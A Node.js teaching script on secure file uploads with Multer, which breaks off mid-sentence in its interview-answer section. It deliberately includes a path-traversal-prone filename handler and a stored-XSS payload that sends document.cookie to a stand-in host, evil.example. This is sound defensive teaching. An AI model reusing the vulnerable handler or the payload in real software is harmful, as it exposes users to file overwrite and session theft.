// ╔══════════════════════════════════════════════════════════════════╗
// ║   Express Deep Dive  →  14_multer-file-upload.js
// ║   Level: Junior → Google/Apple Senior
// ╚══════════════════════════════════════════════════════════════════╝
//
// TARGET:
//   Crack interview questions around: Multer — file upload
//
// WHAT YOU WILL MASTER HERE:
//   1. Why express.json() cannot do this job, proven: a multipart request
//      through the JSON parser leaves req.body undefined and the file lost
//   2. A real multipart/form-data parser written out — boundaries, part
//      headers, Content-Disposition — so the format stops being magic
//   3. Where the data lands: req.body for text fields, req.file/req.files
//      for files, and why they are separate
//   4. memoryStorage vs diskStorage measured on the same 2 MB upload
//   5. limits enforced: fileSize, files and fields, each with the error
//      code Multer actually raises
//   6. Path traversal through file.originalname — a filename of
//      '../../pwned.txt' escaping the upload directory, and the fix
//   7. Why the client-supplied mimetype is worthless, checked against the
//      file's magic bytes
//   8. Orphaned temp files after a failed validation, and the cleanup that
//      is nobody's job by default
//   9. Senior-level follow-up questions
//
// HOW TO RUN:
//   node "learning/phase-2b-node/section-2b.2-express-js/03_express-deep-dive/14_multer-file-upload.js"
//
// Prerequisites: 13_body-parsing-json-urlencoded.js (the Content-Type gate
// and the read-once stream), 09_express-static.js §6 (path traversal, and
// why serving an upload directory is dangerous), and
// section-2b.1-node-core/02_streams-and-buffers/07_fs-streams-for-large-files.js
// (streaming to disk instead of buffering).


const http = require("http");
const fs = require("fs");
const os = require("os");
const path = require("path");
const crypto = require("crypto");

const results = {};

const TMP = fs.mkdtempSync(path.join(os.tmpdir(), "jshub-multer-"));
const UPLOADS = path.join(TMP, "uploads");
fs.mkdirSync(UPLOADS, { recursive: true });


// ══════════════════════════════════════════════════════════════════
// § 1 — THE ONE-SENTENCE DEFINITION
// ══════════════════════════════════════════════════════════════════
//
// Multer:
// a body-parsing middleware for multipart/form-data — the only Content-Type
// that can carry binary files alongside text fields — which splits the
// request stream on its boundary marker, writes file parts to memory or
// disk, and attaches text parts to req.body and file metadata to
// req.file/req.files.
//
// If interviewer says "explain it simply", say:
//   "It's express.json()'s counterpart for uploads. express.json() only
//    handles application/json and ignores everything else, so a file upload
//    passes straight through it with req.body undefined. Multer understands
//    multipart/form-data: it finds the boundary string from the Content-Type
//    header, splits the body into parts, and for each part decides — from
//    Content-Disposition — whether it's a plain field or a file."
//
// If interviewer says "why can't the JSON parser just handle it?", say:
//   "Because the design constraint is completely different. JSON is text you
//    can buffer into a string and parse. A multipart body can be two
//    gigabytes of video, so it has to be streamed somewhere — disk, or S3 —
//    while it arrives. That's why Multer has a storage engine concept at all,
//    and why memoryStorage is a trap for anything user-sized."
//
// Why it matters in interviews:
//   Uploads are where the highest-severity bugs in a CRUD app live: a
//   filename you trusted writing outside your directory, a mimetype you
//   believed, and a 2 GB request that becomes a 2 GB Buffer. All three are
//   demonstrated below.


// ══════════════════════════════════════════════════════════════════
// § 2 — MENTAL MODEL
// ══════════════════════════════════════════════════════════════════
//
// Keyword to remember:
//   ONE BOUNDARY, MANY PARTS. FIELDS → req.body, FILES → req.file(s).
//   EVERY STRING IN THE PART HEADER IS ATTACKER-CONTROLLED.
//
// Runtime rule:
//   Content-Type: multipart/form-data; boundary=X → split the body on --X →
//   each part has its own headers → Content-Disposition names it and, if it
//   is a file, gives a filename → write it via the storage engine → attach
//   metadata → next().
//
// Practical rule:
//   diskStorage (or a stream straight to object storage) with a
//   CRYPTOGRAPHICALLY RANDOM filename, an explicit fileSize and files limit,
//   a fileFilter that checks the extension AND the magic bytes, and a
//   cleanup path for when validation fails after the write.
//
// Common trap:
//   Using file.originalname as the destination filename. It is a string the
//   client chose, it can contain '../', and §7 escapes the upload directory
//   with it.
//
// The mental picture:
//
//   Content-Type: multipart/form-data; boundary=----ABC
//
//   ------ABC
//   Content-Disposition: form-data; name="title"        ← a FIELD
//
//   Holiday photo                                        → req.body.title
//   ------ABC
//   Content-Disposition: form-data; name="photo"; filename="a.png"
//   Content-Type: image/png                              ← a FILE
//
//   <binary bytes>                                       → req.file
//   ------ABC--                                          ← final delimiter


// ══════════════════════════════════════════════════════════════════
// § 3 — PARSING multipart/form-data
// ══════════════════════════════════════════════════════════════════
//
// The format is simpler than its reputation: a delimiter string, parts,
// per-part headers, a blank line, then bytes.

function parseMultipart(buf, boundary) {
  const delim = Buffer.from("--" + boundary);
  const parts = [];
  let cursor = buf.indexOf(delim);
  if (cursor === -1) return parts;
  cursor += delim.length;

  while (cursor < buf.length) {
    if (buf.slice(cursor, cursor + 2).toString() === "--") break;   // final delimiter
    cursor += 2;                                                     // skip CRLF
    const next = buf.indexOf(delim, cursor);
    if (next === -1) break;
    parts.push(parsePart(buf.slice(cursor, next - 2)));              // strip trailing CRLF
    cursor = next + delim.length;
  }
  return parts;
}

function parsePart(part) {
  const sep = part.indexOf("\r\n\r\n");
  const headerText = part.slice(0, sep).toString("utf8");
  const body = part.slice(sep + 4);

  const headers = {};
  for (const line of headerText.split("\r\n")) {
    const i = line.indexOf(":");
    if (i > 0) headers[line.slice(0, i).toLowerCase().trim()] = line.slice(i + 1).trim();
  }
  const cd = headers["content-disposition"] || "";
  return {
    name: (/name="([^"]*)"/.exec(cd) || [])[1],
    // ⚠️ Everything below this line is a string the CLIENT wrote (§7, §8).
    filename: (/filename="([^"]*)"/.exec(cd) || [])[1],
    clientMimetype: headers["content-type"],
    body,
  };
}

// ── storage engines ──
const memoryStorage = () => ({
  name: "memoryStorage",
  save(file) { return { ...file, buffer: file.body, size: file.body.length, storage: "memory" }; },
});

const diskStorage = ({ destination, filename }) => ({
  name: "diskStorage",
  save(file) {
    const finalName = filename(file);
    const target = path.join(destination, finalName);       // 🐛 or ✅ — depends on filename()
    fs.writeFileSync(target, file.body);
    return {
      originalname: file.filename,
      filename: finalName,
      path: target,
      size: file.body.length,
      storage: "disk",
    };
  },
});

// ── the middleware ──
function multer({ storage = memoryStorage(), limits = {}, fileFilter = null } = {}) {
  const { fileSize = Infinity, files = Infinity, fields = Infinity } = limits;

  function makeError(code, message, field) {
    const err = new Error(message);
    err.code = code;                     // Multer's own codes, e.g. LIMIT_FILE_SIZE
    err.field = field;
    err.status = 400;
    return err;
  }

  return function multerMiddleware(req, res, next) {
    const ct = req.headers["content-type"] || "";
    if (!ct.startsWith("multipart/form-data")) return next();        // the same gate as 13 §4
    const boundary = (/boundary=(.+)$/.exec(ct) || [])[1];
    if (!boundary) return next(makeError("LIMIT_UNEXPECTED_FILE", "missing boundary"));

    const chunks = [];
    req.on("data", (c) => chunks.push(c));
    req.on("end", () => {
      const parsed = parseMultipart(Buffer.concat(chunks), boundary);

      req.body = {};
      req.files = [];
      let fileCount = 0, fieldCount = 0;

      for (const part of parsed) {
        if (part.filename === undefined) {                            // a text FIELD
          if (++fieldCount > fields) return next(makeError("LIMIT_FIELD_COUNT", "too many fields", part.name));
          req.body[part.name] = part.body.toString("utf8");
          continue;
        }
        if (++fileCount > files) return next(makeError("LIMIT_FILE_COUNT", "too many files", part.name));
        if (part.body.length > fileSize) {
          return next(makeError("LIMIT_FILE_SIZE", "file too large", part.name));
        }
        const candidate = {
          fieldname: part.name,
          filename: part.filename,
          mimetype: part.clientMimetype,
          body: part.body,
        };
        if (fileFilter) {
          let accepted = true;
          try { accepted = fileFilter(req, candidate); }
          catch (e) { e.status = e.status || 400; return next(e); }
          if (!accepted) return next(makeError("LIMIT_UNEXPECTED_FILE", "file type rejected", part.name));
        }
        req.files.push(storage.save(candidate));
      }
      req.file = req.files[0];
      next();
    });
  };
}

function miniExpress() {
  const stack = [];
  const app = {
    use(fn) { stack.push({ fn }); return app; },
    post(path, ...fns) { for (const fn of fns) stack.push({ path, method: "POST", fn }); return app; },
    listen() {
      return new Promise((resolve) => {
        const server = http.createServer((req, res) => {
          const urlPath = req.url.split("?")[0];
          let i = 0;
          (function next(err) {
            const layer = stack[i++];
            if (!layer) {
              if (res.writableEnded) return;
              res.statusCode = err ? err.status || 500 : 404;
              res.setHeader("content-type", "application/json");
              return res.end(JSON.stringify(err ? { code: err.code || null, error: err.message } : { error: "not found" }));
            }
            const isErr = layer.fn.length === 4;
            if (err && !isErr) return next(err);
            if (!err && isErr) return next();
            if (layer.method && (layer.method !== req.method || layer.path !== urlPath)) return next(err);
            try { err ? layer.fn(err, req, res, next) : layer.fn(req, res, next); }
            catch (e) { next(e); }
          })();
        });
        server.listen(0, "127.0.0.1", () => resolve({ server, port: server.address().port }));
      });
    },
  };
  return app;
}

// Build a multipart body the way a browser would.
function buildMultipart(parts) {
  const boundary = "----JSHubBoundary" + crypto.randomBytes(8).toString("hex");
  const pieces = [];
  for (const p of parts) {
    let head = "--" + boundary + "\r\nContent-Disposition: form-data; name=\"" + p.name + "\"";
    if (p.filename !== undefined) head += "; filename=\"" + p.filename + "\"";
    head += "\r\n";
    if (p.type) head += "Content-Type: " + p.type + "\r\n";
    head += "\r\n";
    pieces.push(Buffer.from(head), Buffer.isBuffer(p.value) ? p.value : Buffer.from(String(p.value)), Buffer.from("\r\n"));
  }
  pieces.push(Buffer.from("--" + boundary + "--\r\n"));
  return { boundary, body: Buffer.concat(pieces) };
}

function upload(port, urlPath, parts, extraHeaders = {}) {
  const { boundary, body } = buildMultipart(parts);
  return new Promise((resolve) => {
    const req = http.request({
      host: "127.0.0.1", port, path: urlPath, method: "POST",
      headers: {
        "content-type": "multipart/form-data; boundary=" + boundary,
        "content-length": body.length,
        ...extraHeaders,
      },
    }, (res) => {
      let out = "";
      res.setEncoding("utf8");
      res.on("data", (c) => (out += c));
      res.on("end", () => resolve({ status: res.statusCode, body: out }));
    });
    req.on("error", (e) => resolve({ status: 0, body: "CLIENT_ERROR: " + e.code }));
    req.end(body);
  });
}


// ══════════════════════════════════════════════════════════════════
// § 4 — WHY express.json() CANNOT DO THIS
// ══════════════════════════════════════════════════════════════════

async function section4() {
  console.log("\n══ § 4 — the same upload through both parsers ══\n");

  const jsonOnly = miniExpress();
  jsonOnly.use((req, res, next) => {                        // a stand-in express.json()
    if ((req.headers["content-type"] || "").split(";")[0] !== "application/json") return next();
    let raw = ""; req.on("data", (c) => (raw += c)); req.on("end", () => { req.body = JSON.parse(raw); next(); });
  });
  jsonOnly.post("/upload", (req, res) => {
    res.setHeader("content-type", "application/json");
    res.end(JSON.stringify({ body: req.body ?? null, file: req.file ?? null }));
  });

  const withMulter = miniExpress();
  withMulter.use(multer({ storage: memoryStorage() }));
  withMulter.post("/upload", (req, res) => {
    res.setHeader("content-type", "application/json");
    res.end(JSON.stringify({
      body: req.body,
      file: req.file && {
        fieldname: req.file.fieldname, originalname: req.file.filename,
        mimetype: req.file.mimetype, size: req.file.size, storage: req.file.storage,
      },
      fileCount: req.files.length,
    }));
  });

  const j = await jsonOnly.listen();
  const m = await withMulter.listen();

  const parts = [
    { name: "title", value: "Holiday photo" },
    { name: "album", value: "2026" },
    { name: "photo", filename: "beach.png", type: "image/png", value: Buffer.from("\x89PNG\r\n\x1a\n fake image bytes") },
  ];

  const viaJson = JSON.parse((await upload(j.port, "/upload", parts)).body);
  const viaMulter = JSON.parse((await upload(m.port, "/upload", parts)).body);

  j.server.close();
  m.server.close();

  results.viaJson = viaJson;
  results.viaMulter = viaMulter;

  console.log("  through a JSON-only parser:");
  console.log("    req.body =", JSON.stringify(viaJson.body));
  console.log("    req.file =", JSON.stringify(viaJson.file), " 🐛 the upload vanished");
  console.log("\n  through multer():");
  console.log("    req.body =", JSON.stringify(viaMulter.body));
  console.log("    req.file =", JSON.stringify(viaMulter.file));
  console.log("    req.files.length =", viaMulter.fileCount);
  console.log("\n  Same request, same bytes on the wire. express.json() looked at the");
  console.log("  Content-Type, saw multipart/form-data, and called next() — exactly the");
  console.log("  silent gate from 13 §4. Nothing errored; the file simply never existed");
  console.log("  as far as the handler was concerned.");
  console.log("\n  Note the split in the multer result: TEXT fields land on req.body and");
  console.log("  FILES land on req.file/req.files. They are separate because a file has");
  console.log("  metadata a string cannot carry — a size, a storage location, an");
  console.log("  original name — and because req.body must stay JSON-serialisable.");
}


// ══════════════════════════════════════════════════════════════════
// § 5 — memoryStorage VS diskStorage
// ══════════════════════════════════════════════════════════════════

async function section5() {
  console.log("\n══ § 5 — where the bytes go ══\n");

  const twoMb = Buffer.alloc(2 * 1024 * 1024, 0x41);

  async function run(storage) {
    const app = miniExpress();
    app.use(multer({ storage }));
    app.post("/u", (req, res) => {
      const f = req.file;
      res.setHeader("content-type", "application/json");
      res.end(JSON.stringify({
        storage: f.storage,
        size: f.size,
        inMemory: Buffer.isBuffer(f.buffer),
        onDisk: f.path ? fs.existsSync(f.path) : false,
        savedAs: f.filename ?? null,
      }));
    });
    const { server, port } = await app.listen();
    const before = process.memoryUsage().heapUsed;
    const r = JSON.parse((await upload(port, "/u", [{ name: "f", filename: "big.bin", value: twoMb }])).body);
    const after = process.memoryUsage().heapUsed;
    server.close();
    return { ...r, heapDeltaMb: (after - before) / 1024 / 1024 };
  }

  const mem = await run(memoryStorage());
  const disk = await run(diskStorage({
    destination: UPLOADS,
    filename: () => crypto.randomBytes(16).toString("hex") + ".bin",     // ✅ §7
  }));

  results.memoryStorage = mem;
  results.diskStorage = disk;

  console.log("  memoryStorage →", JSON.stringify(mem));
  console.log("  diskStorage   →", JSON.stringify(disk));
  console.log("\n  Both received the same 2 MB. The difference is where it lives:");
  console.log("   • memoryStorage gives you file.buffer — convenient, and the whole");
  console.log("     file is resident in the heap. Multiply by concurrency: ten users");
  console.log("     uploading 200 MB videos is 2 GB of heap, and Node's heap has a");
  console.log("     ceiling. This is the same buffered-vs-streamed argument as");
  console.log("     2B.1 · 02_streams-and-buffers/07, with a worse failure mode,");
  console.log("     because the input size is chosen by a stranger.");
  console.log("   • diskStorage gives you file.path — the bytes are on disk, the heap");
  console.log("     barely moves, and you now own a file that something must delete");
  console.log("     (§8).");
  console.log("\n  Use memoryStorage only for genuinely small, bounded uploads — a CSV");
  console.log("  under a known limit, an avatar you are about to resize. For anything");
  console.log("  user-sized, stream to disk or straight to object storage, and pair it");
  console.log("  with a fileSize limit so the choice is enforced, not hoped for.");
}


// ══════════════════════════════════════════════════════════════════
// § 6 — LIMITS
// ══════════════════════════════════════════════════════════════════

async function section6() {
  console.log("\n══ § 6 — the three limits and their error codes ══\n");

  const app = miniExpress();
  app.use(multer({
    storage: memoryStorage(),
    limits: { fileSize: 1024, files: 2, fields: 3 },
  }));
  app.post("/u", (req, res) => {
    res.setHeader("content-type", "application/json");
    res.end(JSON.stringify({ ok: true, files: req.files.length, fields: Object.keys(req.body).length }));
  });
  app.use((err, req, res, next) => {
    res.statusCode = err.status || 500;
    res.setHeader("content-type", "application/json");
    res.end(JSON.stringify({ code: err.code, error: err.message, field: err.field ?? null }));
  });

  const { server, port } = await app.listen();

  const small = Buffer.alloc(500, 0x42);
  const big = Buffer.alloc(4096, 0x42);

  const ok = await upload(port, "/u", [
    { name: "a", value: "1" },
    { name: "f1", filename: "a.bin", value: small },
  ]);
  const tooBig = await upload(port, "/u", [{ name: "f", filename: "big.bin", value: big }]);
  const tooMany = await upload(port, "/u", [
    { name: "f1", filename: "1.bin", value: small },
    { name: "f2", filename: "2.bin", value: small },
    { name: "f3", filename: "3.bin", value: small },
  ]);
  const tooManyFields = await upload(port, "/u", [
    { name: "a", value: "1" }, { name: "b", value: "2" },
    { name: "c", value: "3" }, { name: "d", value: "4" },
  ]);
  server.close();

  results.limits = {
    ok: { status: ok.status, body: JSON.parse(ok.body) },
    fileSize: { status: tooBig.status, body: JSON.parse(tooBig.body) },
    fileCount: { status: tooMany.status, body: JSON.parse(tooMany.body) },
    fieldCount: { status: tooManyFields.status, body: JSON.parse(tooManyFields.body) },
  };

  console.log("  within all limits    →", ok.status, ok.body);
  console.log("  file over fileSize   →", tooBig.status, tooBig.body);
  console.log("  more files than max  →", tooMany.status, tooMany.body);
  console.log("  more fields than max →", tooManyFields.status, tooManyFields.body);
  console.log("\n  Those codes matter: Multer raises a MulterError with a `code`, so the");
  console.log("  error handler can map LIMIT_FILE_SIZE to a message a user can act on");
  console.log("  instead of a generic 500. In real Multer you check");
  console.log("  `err instanceof multer.MulterError` first — the same shape as 13 §8's");
  console.log("  SyntaxError check, and the same failure if a catch-all handler");
  console.log("  discards it.");
  console.log("\n  The limit that matters most is fileSize, and it has no default in");
  console.log("  Multer. Without it, one request can fill your disk or your heap.");
  console.log("  Setting it is not optional hardening; it is the configuration.");
}


// ══════════════════════════════════════════════════════════════════
// § 7 — THE FILENAME AND THE MIMETYPE ARE BOTH LIES
// ══════════════════════════════════════════════════════════════════

async function section7() {
  console.log("\n══ § 7 — two strings the client chose ══\n");

  // (a) using originalname as the destination — traversal.
  const naiveDir = path.join(TMP, "naive-uploads");
  fs.mkdirSync(naiveDir, { recursive: true });
  const naive = miniExpress();
  naive.use(multer({
    storage: diskStorage({ destination: naiveDir, filename: (f) => f.filename }),   // 🐛
  }));
  naive.post("/u", (req, res) => { res.end(JSON.stringify({ path: req.file.path })); });

  const safeDir = path.join(TMP, "safe-uploads");
  fs.mkdirSync(safeDir, { recursive: true });
  const safe = miniExpress();
  safe.use(multer({
    storage: diskStorage({
      destination: safeDir,
      filename: (f) => crypto.randomBytes(16).toString("hex") + path.extname(f.filename).slice(0, 10),  // ✅
    }),
  }));
  safe.post("/u", (req, res) => { res.end(JSON.stringify({ path: req.file.path })); });

  const n = await naive.listen();
  const s = await safe.listen();

  const evilName = "../../pwned.txt";
  const naiveRes = JSON.parse((await upload(n.port, "/u",
    [{ name: "f", filename: evilName, value: Buffer.from("owned") }])).body);
  const safeRes = JSON.parse((await upload(s.port, "/u",
    [{ name: "f", filename: evilName, value: Buffer.from("owned") }])).body);

  n.server.close();
  s.server.close();

  const escapedPath = path.resolve(naiveRes.path);
  const escaped = !escapedPath.startsWith(path.resolve(naiveDir) + path.sep);
  const safeContained = path.resolve(safeRes.path).startsWith(path.resolve(safeDir) + path.sep);

  results.traversal = {
    filenameSent: evilName,
    naiveWroteTo: escapedPath,
    escapedTheDirectory: escaped,
    fileExistsOutside: fs.existsSync(escapedPath),
    safeWroteTo: path.basename(safeRes.path),
    safeContained,
  };

  console.log("  (a) client sent filename:", JSON.stringify(evilName));
  console.log("      naive (filename = originalname) wrote to:");
  console.log("        ", escapedPath);
  console.log("        outside the upload directory:", escaped, " 🐛");
  console.log("        file exists there           :", results.traversal.fileExistsOutside, " 🐛");
  console.log("      safe (random name + extension) wrote to:");
  console.log("        ", results.traversal.safeWroteTo);
  console.log("        contained:", safeContained, " ✅");

  // (b) the mimetype is whatever the client typed.
  const HTML_BOMB = Buffer.from("<script>document.location='https://evil.example/'+document.cookie</script>");
  const REAL_PNG = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 1, 2, 3]);

  const magicIsPng = (buf) =>
    buf.length >= 8 && buf.slice(0, 8).equals(Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]));

  const trusting = miniExpress();
  trusting.use(multer({
    storage: memoryStorage(),
    fileFilter: (req, file) => file.mimetype === "image/png",              // 🐛 client-supplied
  }));
  trusting.post("/u", (req, res) => res.end(JSON.stringify({ accepted: true, mimetype: req.file.mimetype })));
  trusting.use((err, req, res, next) => { res.statusCode = 400; res.end(JSON.stringify({ code: err.code })); });

  const checking = miniExpress();
  checking.use(multer({
    storage: memoryStorage(),
    fileFilter: (req, file) =>                                            // ✅ the bytes
      file.mimetype === "image/png" && magicIsPng(file.body),
  }));
  checking.post("/u", (req, res) => res.end(JSON.stringify({ accepted: true })));
  checking.use((err, req, res, next) => { res.statusCode = 400; res.end(JSON.stringify({ code: err.code })); });

  const t = await trusting.listen();
  const c = await checking.listen();

  const disguised = [{ name: "f", filename: "innocent.png", type: "image/png", value: HTML_BOMB }];
  const genuine = [{ name: "f", filename: "real.png", type: "image/png", value: REAL_PNG }];

  const trustedDisguise = await upload(t.port, "/u", disguised);
  const checkedDisguise = await upload(c.port, "/u", disguised);
  const checkedGenuine = await upload(c.port, "/u", genuine);

  t.server.close();
  c.server.close();

  results.mimetype = {
    trustedDisguise: trustedDisguise.status,
    checkedDisguise: checkedDisguise.status,
    checkedGenuine: checkedGenuine.status,
  };

  console.log("\n  (b) an HTML/JS payload uploaded as filename='innocent.png',");
  console.log("      Content-Type: image/png");
  console.log("      filter trusting file.mimetype  →", trustedDisguise.status, " 🐛 accepted");
  console.log("      filter checking magic bytes    →", checkedDisguise.status, " ✅ rejected");
  console.log("      a genuine PNG through the same →", checkedGenuine.status, " ✅ accepted");
  console.log("\n  file.mimetype is copied verbatim out of the part header. The client");
  console.log("  wrote it. So is the extension. Checking either one alone is checking");
  console.log("  the attacker's claim about the attacker's file.");
  console.log("\n  And the reason it matters is 09 §5 and §8: if that file is later");
  console.log("  served from your origin, the browser may sniff it as HTML and run it —");
  console.log("  stored XSS with your cookies. Defence in depth: random filenames, magic");
  console.log("  byte checks, a fixed Content-Type on the way out, nosniff, and uploads");
  console.log("  served from a different origin than your app.");
}


// ══════════════════════════════════════════════════════════════════
// § 8 — THE FILE THAT SURVIVES A FAILED REQUEST
// ══════════════════════════════════════════════════════════════════
//
// Multer writes the file BEFORE your handler runs — it has to, it is a body
// parser. So every validation that happens in the handler happens after the
// bytes are already on disk.

async function section8() {
  console.log("\n══ § 8 — orphans ══\n");

  const orphanDir = path.join(TMP, "orphans");
  fs.mkdirSync(orphanDir, { recursive: true });

  const leaky = miniExpress();
  leaky.use(multer({ storage: diskStorage({ destination: orphanDir, filename: () => crypto.randomBytes(8).toString("hex") + ".bin" }) }));
  leaky.post("/u", (req, res) => {
    if (req.body.token !== "valid") {                    // 🐛 validated AFTER the write
      res.statusCode = 403;
      return res.end(JSON.stringify({ error: "forbidden" }));
    }
    res.end(JSON.stringify({ ok: true }));
  });

  const tidyDir = path.join(TMP, "tidy");
  fs.mkdirSync(tidyDir, { recursive: true });
  const tidy = miniExpress();
  tidy.use(multer({ storage: diskStorage({ destination: tidyDir, filename: () => crypto.randomBytes(8).toString("hex") + ".bin" }) }));
  tidy.post("/u", (req, res) => {
    const cleanup = () => { for (const f of req.files) fs.rmSync(f.path, { force: true }); };
    if (req.body.token !== "valid") {
      cleanup();                                         // ✅ explicit, and yours to write
      res.statusCode = 403;
      return res.end(JSON.stringify({ error: "forbidden" }));
    }
    res.end(JSON.stringify({ ok: true }));
  });

  const l = await leaky.listen();
  const t = await tidy.listen();

  for (let i = 0; i < 5; i++) {
    const parts = [{ name: "token", value: "wrong" }, { name: "f", filename: "x.bin", value: Buffer.alloc(1024) }];
    await upload(l.port, "/u", parts);
    await upload(t.port, "/u", parts);
  }

  l.server.close();
  t.server.close();

  results.orphans = {
    rejectedRequests: 5,
    leakyFiles: fs.readdirSync(orphanDir).length,
    tidyFiles: fs.readdirSync(tidyDir).length,
    leakyBytes: fs.readdirSync(orphanDir).reduce((n, f) => n + fs.statSync(path.join(orphanDir, f)).size, 0),
  };

  console.log("  5 uploads, every one REJECTED with 403 by the handler:\n");
  console.log("    files left behind, no cleanup :", results.orphans.leakyFiles,
              "(" + results.orphans.leakyBytes + " bytes) 🐛");
  console.log("    files left behind, with cleanup:", results.orphans.tidyFiles, " ✅");
  console.log("\n  Not one of those requests was authorised, and all five wrote a file.");
  console.log("  That is not a Multer bug — it is the consequence of it being a BODY");
  console.log("  PARSER: it runs before your handler by definition, so the write always");
  console.log("  precedes your business rules.");
  console.log("\n  Three ways this bites:");
  console.log("   • An unauthenticated endpoint with an upload becomes free disk for");
  console.log("     anyone on the internet. Put auth and rate limiting ABOVE the multer");
  console.log("     middleware (01 §4, 12) so unauthorised requests never reach it.");
  console.log("   • Validation failures inside the handler need explicit cleanup —");
  console.log("     including in the ERROR handler, which is where the ones you did not");
  console.log("     anticipate land (03).");
  console.log("   • Even with perfect cleanup, a crash between the write and the delete");
  console.log("     leaves the file. Production systems assume orphans exist and run a");
  console.log("     sweeper over files older than N hours.");
}


// ══════════════════════════════════════════════════════════════════
// § 9 — REAL BUGS THIS CAUSES
// ══════════════════════════════════════════════════════════════════
//
// Bug 1 — req.body undefined and no file, because only express.json() was
//   registered. It skips multipart silently. → §4
//
// Bug 2 — Out-of-memory under concurrent uploads because memoryStorage was
//   the default in the tutorial. → §5
//
// Bug 3 — No fileSize limit, so one request fills the disk. Multer has no
//   default. → §6
//
// Bug 4 — A file written outside the upload directory because filename()
//   returned file.originalname and the client sent '../../'. → §7
//
// Bug 5 — Two users uploading 'photo.png' and one silently overwriting the
//   other, for the same reason. → §7
//
// Bug 6 — A stored-XSS payload accepted because the fileFilter trusted
//   file.mimetype, which the client wrote. → §7
//
// Bug 7 — That file then served from the app's own origin and sniffed as
//   HTML. → 09 §5, 11 §5
//
// Bug 8 — Orphaned files accumulating from rejected requests. → §8
//
// Bug 9 — An unauthenticated upload endpoint used as free storage, because
//   auth was registered below multer. → §8, 01 §4
//
// Bug 10 — LIMIT_FILE_SIZE surfacing as a 500 because the error handler
//   ignored err.code. → §6, 13 §8
//
// Bug 11 — A zip bomb or an image decompression bomb: 1 MB uploaded,
//   gigabytes on decode. A fileSize limit does not protect the DECODER.
//
// Bug 12 — Assuming req.file exists. With upload.array() or when no file was
//   sent, it is undefined and req.files is the array.


// ══════════════════════════════════════════════════════════════════
// § 10 — MINI ASSERTIONS
// ══════════════════════════════════════════════════════════════════

const assert = require("assert").strict;

function assertions() {
  console.log("\n══ § 10 — assertions ══\n");

  // § 4 — the gate:
  assert.equal(results.viaJson.body, null, "a JSON-only parser left req.body untouched for a multipart upload 🐛");
  assert.equal(results.viaJson.file, null, "…and the file was simply lost 🐛");
  assert.deepEqual(results.viaMulter.body, { title: "Holiday photo", album: "2026" },
    "multer put the TEXT fields on req.body ✅");
  assert.equal(results.viaMulter.file.fieldname, "photo", "…and the file on req.file ✅");
  assert.equal(results.viaMulter.file.originalname, "beach.png");
  assert.equal(results.viaMulter.file.mimetype, "image/png");
  assert.equal(results.viaMulter.fileCount, 1, "…with req.files carrying the full list");

  // § 5 — storage:
  assert.equal(results.memoryStorage.storage, "memory");
  assert.equal(results.memoryStorage.inMemory, true, "memoryStorage exposed file.buffer ✅");
  assert.equal(results.memoryStorage.size, 2 * 1024 * 1024, "…holding the whole 2 MB in the heap 🐛");
  assert.equal(results.diskStorage.storage, "disk");
  assert.equal(results.diskStorage.onDisk, true, "diskStorage wrote the bytes to a real file ✅");
  assert.equal(results.diskStorage.inMemory, false, "…and exposed no buffer");
  assert.equal(results.diskStorage.size, 2 * 1024 * 1024);

  // § 6 — limits:
  const L = results.limits;
  assert.equal(L.ok.status, 200);
  assert.deepEqual(L.ok.body, { ok: true, files: 1, fields: 1 });
  assert.equal(L.fileSize.status, 400);
  assert.equal(L.fileSize.body.code, "LIMIT_FILE_SIZE", "an oversized file raised LIMIT_FILE_SIZE ✅");
  assert.equal(L.fileCount.body.code, "LIMIT_FILE_COUNT", "too many files raised LIMIT_FILE_COUNT ✅");
  assert.equal(L.fieldCount.body.code, "LIMIT_FIELD_COUNT", "too many fields raised LIMIT_FIELD_COUNT ✅");

  // § 7 — filename and mimetype:
  assert.equal(results.traversal.escapedTheDirectory, true,
    "using the client's filename wrote OUTSIDE the upload directory 🐛");
  assert.equal(results.traversal.fileExistsOutside, true, "…and the file is really there 🐛");
  assert.equal(results.traversal.safeContained, true,
    "…while a random generated name stayed inside it ✅");
  assert.ok(/^[0-9a-f]{32}\.txt$/.test(results.traversal.safeWroteTo),
    "…and carried no attacker-controlled characters at all ✅ (" + results.traversal.safeWroteTo + ")");

  assert.equal(results.mimetype.trustedDisguise, 200,
    "a script payload labelled image/png passed a filter that trusted file.mimetype 🐛");
  assert.equal(results.mimetype.checkedDisguise, 400,
    "…and was rejected by a filter that checked the magic bytes ✅");
  assert.equal(results.mimetype.checkedGenuine, 200,
    "…while a genuine PNG still passed that filter ✅");

  // § 8 — orphans:
  assert.equal(results.orphans.leakyFiles, 5,
    "five REJECTED requests still left five files on disk 🐛");
  assert.ok(results.orphans.leakyBytes > 0, "…occupying real space 🐛");
  assert.equal(results.orphans.tidyFiles, 0,
    "…while explicit cleanup in the rejection path left none ✅");

  console.log("§10 — mini assertions passed for: Multer — file upload");
  console.log("\n  The pair that captures it: a filename of '../../pwned.txt' wrote a file");
  console.log("  outside the upload directory — and five requests that were all rejected");
  console.log("  with 403 still left five files behind.");
}


// ══════════════════════════════════════════════════════════════════
// § 11 — INTERVIEW ANSWER TEMPLATE
// ══════════════════════════════════════════════════════════════════
//
// When asked "how do you handle file uploads in Express?", answer:
//
//   "Multer, because it's the parser for multipart/form-data, which is the
//    only Content-Type that carries binary files alongside text fields.
//    express.json() looks at the Content-Type, sees multipart, and calls
//    next() — so without Multer req.body is undefined and the file is simply
//    gone, with no error anywhere. Mechanically Multer reads the boundary
//    out of the Content-Type header, splits the body into parts, and uses
//    each part's Content-Disposition to decide whether it's a field, which
//    goes on req.body, or a file, which goes to a storage engine and then
//    onto req.file or req.files.
//
//    The storage choice is the first real decision. memoryStorage gives you
//    file.buffer and holds the entire file in the heap — fine for a bounded
//    CSV or an avatar, catastrophic for anything user-sized, because the
//    input size is chosen by a stranger and it multiplies by concurrency.
//    diskStorage, or streaming straight to object storage, keeps the heap
//    flat and hands you a file you now own.
//
//    Then limits, and fileSize is the important one because Multer has no
//    default — without it a single request can fill your disk. Multer raises
//    a MulterError with a code like LIMIT_FILE_SIZE, so the error handler can
//    turn it into a usable message rather than a 500.
//
//    The two things I'd flag hardest are that both the filename and the
//    mimetype are strings the client wrote. If you use originalname as the
//    destination filename, a filename of '../../pwned.txt' writes outside
//    your upload directory — I can reproduce that. So the filename is always
//    random bytes plus, at most, a sanitised extension, which also fixes two
//    users overwriting each other's photo.png. And a fileFilter that checks
